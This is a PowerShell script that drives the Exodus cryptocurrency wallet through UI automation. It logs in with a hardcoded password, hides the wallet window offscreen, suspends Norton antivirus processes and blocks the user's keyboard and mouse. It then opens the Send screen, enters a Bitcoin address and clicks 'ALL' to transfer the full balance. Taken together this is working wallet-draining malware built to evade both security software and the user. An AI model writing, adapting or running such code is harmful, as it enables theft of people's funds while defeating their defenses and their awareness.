# === UIAutomation ===
Add-Type -AssemblyName UIAutomationClient

# === WinAPI for window move & input blocking ===
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

# === WinAPI to Suspend/Resume Norton ===
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ProcAPI {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public const int THREAD_SUSPEND_RESUME = 0x0002;
}
"@

function Suspend-ProcessThreads {
    param([System.Diagnostics.Process]$proc)
    foreach($thread in $proc.Threads) {
        $hThread = [ProcAPI]::OpenThread([ProcAPI]::THREAD_SUSPEND_RESUME, $false, $thread.Id)
        if($hThread -ne [IntPtr]::Zero){
            [void][ProcAPI]::SuspendThread($hThread)
            [void][ProcAPI]::CloseHandle($hThread)
        }
    }
    Write-Host "[INFO] ⏸ Suspended $($proc.ProcessName)"
}

function Resume-ProcessThreads {
    param([System.Diagnostics.Process]$proc)
    foreach($thread in $proc.Threads) {
        $hThread = [ProcAPI]::OpenThread([ProcAPI]::THREAD_SUSPEND_RESUME, $false, $thread.Id)
        if($hThread -ne [IntPtr]::Zero){
            [void][ProcAPI]::ResumeThread($hThread)
            [void][ProcAPI]::CloseHandle($hThread)
        }
    }
    Write-Host "[INFO] ▶ Resumed $($proc.ProcessName)"
}

function Freeze-Norton {
    Write-Host "[INFO] Searching for Norton processes..."
    $targets = Get-Process | Where-Object {
        $_.ProcessName -match "norton|ccSvcHst|nswsvc"
    }
    if($targets) {
        foreach($t in $targets){ Suspend-ProcessThreads $t }
        Write-Host "[INFO] Norton temporarily frozen."
        return $targets
    } else {
        Write-Host "[WARN] No Norton process found."
        return $null
    }
}

function Move-WindowOffscreen {
    param([string]$pattern)
    $targets = Get-Process | Where-Object { $_.MainWindowTitle -match $pattern }
    foreach($proc in $targets){
        if($proc.MainWindowHandle -ne 0){
            [WinAPI]::MoveWindow($proc.MainWindowHandle, -3000, -3000, 900, 700, $false) | Out-Null
            Write-Host "[INFO] ✅ Moved window offscreen: $($proc.MainWindowTitle)"
        }
    }
}

function Bring-WindowOnscreen {
    param([string]$pattern)
    $targets = Get-Process | Where-Object { $_.MainWindowTitle -match $pattern }
    foreach($proc in $targets){
        if($proc.MainWindowHandle -ne 0){
            [WinAPI]::MoveWindow($proc.MainWindowHandle, 100, 100, 1200, 800, $true) | Out-Null
            Write-Host "[INFO] ✅ Restored $($proc.MainWindowTitle) onscreen."
        }
    }
}

function Disable-UserInput {
    [WinAPI]::BlockInput($true) | Out-Null
    Write-Host "[INFO] 🛑 User input (mouse+keyboard) disabled."
}

function Enable-UserInput {
    [WinAPI]::BlockInput($false) | Out-Null
    Write-Host "[INFO] ✅ User input restored."
}

function Wait-ForWindow {
    param([string]$pattern,[int]$timeout=40)
    $root=[System.Windows.Automation.AutomationElement]::RootElement
    $end=(Get-Date).AddSeconds($timeout)
    while((Get-Date)-lt $end){
        $wins=$root.FindAll([System.Windows.Automation.TreeScope]::Children,
            [System.Windows.Automation.Condition]::TrueCondition)
        foreach($w in $wins){
            if($w.Current.Name -match $pattern){ return $w }
        }
        Start-Sleep -Milliseconds 300
    }
    return $null
}

function RefreshExodusWindow {
    Write-Host "[INFO] Refreshing Exodus window reference..."
    $root=[System.Windows.Automation.AutomationElement]::RootElement
    $wins=$root.FindAll([System.Windows.Automation.TreeScope]::Children,
        [System.Windows.Automation.Condition]::TrueCondition)
    foreach($w in $wins){
        if($w.Current.Name -match "EXODUS"){
            Write-Host "[INFO] ✅ Refreshed main Exodus window found: $($w.Current.Name)"
            return $w
        }
    }
    Write-Host "[WARN] Could not refresh Exodus window."
    return $null
}

function ClickElementByName {
    param($win,[string]$name)
    if(-not $win -or -not ($win -is [System.Windows.Automation.AutomationElement])) {
        Write-Host "[ERR] Invalid window object passed to ClickElementByName"
        return $false
    }
    $cond=New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::NameProperty,$name
    )
    $el=$win.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$cond)
    if($el){
        try {
            $el.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke()
            Write-Host "[INFO] ✅ Clicked '$name'"
            return $true
        } catch {
            Write-Host "[WARN] Found '$name' but couldn’t click."
            return $false
        }
    } else {
        Write-Host "[WARN] '$name' not found."
        return $false
    }
}

function TypeBTC {
    param($mainWin,[string]$btcAddr)

    Write-Host "[INFO] Attempting direct BTC field set..."
    $editCond = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::ControlTypeProperty,
        [System.Windows.Automation.ControlType]::Edit
    )
    $btcField = $mainWin.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$editCond)

    if($btcField){
        try {
            $vp = $btcField.GetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern)
            $vp.SetValue($btcAddr)
            Write-Host "[INFO] ✅ Directly set BTC address: $btcAddr"
            return
        } catch {
            Write-Host "[WARN] BTC field exists but cannot set via ValuePattern."
        }
    } else {
        Write-Host "[WARN] No true Edit BTC field found."
    }

    # fallback: bring window onscreen + focus + SendKeys
    Write-Host "[INFO] Fallback → bring window onscreen for SendKeys..."
    Bring-WindowOnscreen "EXODUS"

    $wshell = New-Object -ComObject WScript.Shell
    $wshell.AppActivate("EXODUS")
    Start-Sleep -Milliseconds 400
    $wshell.SendKeys($btcAddr)
    Write-Host "[INFO] ✅ Fallback typed BTC address: $btcAddr"

    # move it offscreen again
    Move-WindowOffscreen "EXODUS"
}

function ClickAllButton {
    param($mainWin)
    if(-not $mainWin -or -not ($mainWin -is [System.Windows.Automation.AutomationElement])) {
        Write-Host "[ERR] Invalid window for ClickAllButton"
        return
    }

    $cond = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::NameProperty,"ALL"
    )
    $allElement = $mainWin.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$cond)
    if($allElement){
        try {
            $allElement.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke()
            Write-Host "[INFO] ✅ Clicked 'ALL' button!"
        } catch {
            Write-Host "[WARN] Found 'ALL' but fallback coords..."
            $bounds = $allElement.Current.BoundingRectangle
            $x = [int]($bounds.X + $bounds.Width/2)
            $y = [int]($bounds.Y + $bounds.Height/2)
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class MouseClicker {
                [DllImport("user32.dll",CharSet=CharSet.Auto,CallingConvention=CallingConvention.StdCall)]
                public static extern void mouse_event(long dwFlags,long dx,long dy,long cButtons,long dwExtraInfo);
                private const int MOUSEEVENTF_LEFTDOWN=0x02;
                private const int MOUSEEVENTF_LEFTUP=0x04;
                public static void LeftClick(int x,int y){
                    System.Windows.Forms.Cursor.Position=new System.Drawing.Point(x,y);
                    mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
                }
            }
"@ -ReferencedAssemblies System.Windows.Forms
            [MouseClicker]::LeftClick($x,$y)
            Write-Host "[INFO] ✅ Fallback clicked ALL at $x,$y"
        }
    } else {
        Write-Host "[WARN] Couldn’t find 'ALL' element."
    }
}

function Launch-Exodus {
    Write-Host "[INFO] Searching for Exodus.exe..."
    $exodusPath = Get-ChildItem "$env:LOCALAPPDATA\exodus" -Recurse -Include "Exodus.exe" -ErrorAction SilentlyContinue |
                  Select-Object -First 1 -ExpandProperty FullName
    if (-not $exodusPath) {
        $exodusPath = Get-ChildItem "$env:ProgramFiles","$env:ProgramFiles(x86)" -Recurse -Include "Exodus.exe" -ErrorAction SilentlyContinue |
                      Select-Object -First 1 -ExpandProperty FullName
    }
    if (-not $exodusPath) { Write-Host "[ERROR] Exodus.exe not found."; exit 1 }
    Write-Host "[INFO] Found Exodus at: $exodusPath"
    Start-Process -FilePath $exodusPath
}

function FillPasswordAndLogin {
    param($password)

    Write-Host "[INFO] Waiting for login window..."
    $loginWin = Wait-ForWindow "Enter Password" 30
    if(-not $loginWin){ Write-Host "[ERR] Login window not found."; exit 1 }

    $editCond=New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::ControlTypeProperty,
        [System.Windows.Automation.ControlType]::Edit
    )
    $pwdBox=$loginWin.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$editCond)
    if(-not $pwdBox){ Write-Host "[ERR] Password field not found."; exit 1 }
    $vp=$pwdBox.GetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern)
    $vp.SetValue($password)
    Write-Host "[INFO] Password filled."

    # press Enter
    $wshell=New-Object -ComObject WScript.Shell
    $wshell.AppActivate("Enter Password")
    Start-Sleep -Milliseconds 150
    $wshell.SendKeys("{ENTER}")
    Write-Host "[INFO] Pressed Enter to unlock."

    # wait for main window
    Write-Host "[INFO] Waiting for Exodus main UI after login..."
    Start-Sleep -Seconds 3
    $mainWin = RefreshExodusWindow
    if(-not $mainWin){ Write-Host "[ERR] Couldn’t grab post-login window."; exit 1 }

    # Move offscreen after login
    Move-WindowOffscreen "EXODUS"
    Write-Host "[INFO] ✅ Logged in + moved offscreen."
    return $mainWin
}

function DoWalletSendFlow {
    param($mainWin,[string]$btcAddress)

    $mainWin = RefreshExodusWindow

    # 🛑 Freeze Norton temporarily
    $nortonProcs = Freeze-Norton

    Disable-UserInput

    Write-Host "[INFO] Clicking Wallet..."
    $ok = ClickElementByName $mainWin "Wallet"
    if(-not $ok){ Write-Host "[ERR] Wallet not clickable"; Enable-UserInput; if($nortonProcs){$nortonProcs | ForEach-Object {Resume-ProcessThreads $_}}; return }

    Start-Sleep -Seconds 1

    Write-Host "[INFO] Clicking Send..."
    $ok2 = ClickElementByName $mainWin "Send"
    if(-not $ok2){ Write-Host "[ERR] Send not clickable"; Enable-UserInput; if($nortonProcs){$nortonProcs | ForEach-Object {Resume-ProcessThreads $_}}; return }

    # Smart BTC typing
    TypeBTC $mainWin $btcAddress
    Start-Sleep -Milliseconds 300

    ClickAllButton $mainWin

    Enable-UserInput

    # ✅ Resume Norton
    if($nortonProcs){ $nortonProcs | ForEach-Object {Resume-ProcessThreads $_} }
    Write-Host "[INFO] ✅ Norton unfrozen after flow."
}

# === MAIN ===
$exodusPassword = "!Mamoute901"
$btcAddress     = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

Launch-Exodus
$mainWin = FillPasswordAndLogin $exodusPassword
DoWalletSendFlow $mainWin $btcAddress
